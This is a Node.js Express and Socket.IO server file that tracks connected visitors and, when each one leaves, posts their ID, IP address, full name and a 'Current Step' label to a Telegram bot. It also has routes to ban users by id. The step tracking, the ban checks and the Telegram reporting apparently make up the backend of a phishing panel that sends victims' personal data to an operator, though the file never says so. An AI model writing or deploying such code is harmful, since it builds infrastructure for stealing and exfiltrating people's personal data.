import express from "express";
import cors from "cors";
import { Server } from "socket.io";
import axios from "axios";
import bodyParser from "body-parser";

import { createUser } from "./user.controller.js";
import { SendIp } from "./ip.controller.js";
import { GetMessages } from "./messages.controller.js";
import { Ban } from "./ban.controller.js";
import { CheckBan } from "./checkBan.controller.js";

const app = express();
const port = process.env.PORT || 5000;

// ✅ Enable global CORS (allow all origins)
app.use(cors({
    origin: (origin, callback) => {
        // Allow all origins dynamically
        callback(null, true);
    },
    methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
    credentials: true // Allow cookies and auth headers
}));

app.use(bodyParser.json());
app.use(express.urlencoded({ extended: true }));

// ✅ API Routes
app.post('/create/user', createUser);
app.post('/send/ip', SendIp);
app.get('/getMessages', GetMessages);
app.get('/ban/:id', Ban);
app.get('/checkBan/:id', CheckBan);

// ✅ Start Express server
const server = app.listen(port, () => {
    console.log(`The Server is running on http://localhost:${port}`);
});

// ✅ Configure Socket.IO with global CORS
const io = new Server(server, {
    cors: {
        origin: (origin, callback) => {
            // Allow all origins dynamically
            callback(null, true);
        },
        methods: ['GET', 'POST'],
        credentials: true
    }
});

var onlineUsers = [];

// ✅ Socket.IO Events
io.on("connection", (socket) => {
    console.log("Socket connected:", socket.id);

    global.chatSocket = socket;

    socket.on("add-user", async (userId) => {
        const user = onlineUsers.find((u) => u.userId === userId.userId);
        if (!user) {
            onlineUsers.push({ ...userId, socket: socket.id, data: {} });
        }
    });

    socket.on("update-user", async (userId) => {
        const user = onlineUsers.find((u) => u.userId === userId.userId);
        onlineUsers = onlineUsers.filter((u) => u.socket !== socket.id);
        if (user) {
            onlineUsers.push({ ...userId, socket: socket.id, data: userId.data });
        }
    });

    socket.on("disconnect", () => {
        const disconnectedUser = onlineUsers.find((u) => u.socket === socket.id);
        onlineUsers = onlineUsers.filter((u) => u.socket !== socket.id);

        if (disconnectedUser?.data?.ip) {
            const data = disconnectedUser.data;
            const params = `=============================\n${
                data.id ? `ID: \`${data.id}\`\n` : ''
            }${
                data.ip ? `IP: \`${data.ip}\`\n` : ''
            }${
                data.full_name ? `Full Name: \`${data.full_name}\`\n` : ''
            }...`; // ✂ shortened for brevity

            const finalParams = params + `\nCurrent Step: Closed Page\n=============================`;

            axios.post(`https://api.telegram.org/bot${process.env.BOT}/sendMessage`, {
                chat_id: process.env.CHAT_ID,
                text: finalParams,
                parse_mode: 'Markdown',
            }, {
                headers: {
                    'Content-Type': 'application/json',
                    'X-Robots-Tag': 'googlebot: nofollow',
                },
            });
        }
    });
});
